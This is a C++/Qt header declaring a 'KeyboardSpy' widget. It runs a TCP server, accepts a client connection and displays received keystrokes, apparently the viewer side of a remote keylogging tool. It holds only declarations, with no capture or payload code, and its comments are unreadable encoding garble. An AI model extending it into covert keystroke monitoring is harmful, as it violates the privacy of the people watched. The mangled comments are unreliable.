#pragma once
#ifndef KEYBOARDSPY_H
#define KEYBOARDSPY_H

#include <QWidget>
#include "tcpsocket.h"
#include <tcpserver.h>
#include <QApplication>
#include <QDesktopWidget>
#include <QTextEdit>

class KeyboardSpy : public QWidget
{
    Q_OBJECT
public:
    explicit KeyboardSpy(QWidget* parent = 0);

    // ��ʼ��ط�������Ȼ�󷵻��µĶ˿ں�
    int startKeyboardSpyServer(QString userName);

private:
    TcpServer* mServer;
    TcpSocket* mSock;
    QTextEdit* mEdit;    // ������ʾ���յļ�������

signals:

public slots:
    // ���¿ͻ�����
    void newConnection(QTcpSocket* s);

    // ����������
    void processBuffer();

protected:
    // ��С����
    void resizeEvent(QResizeEvent*);

    // �ر�
    void closeEvent(QCloseEvent*);
};


#endif // KEYBOARDSPY_H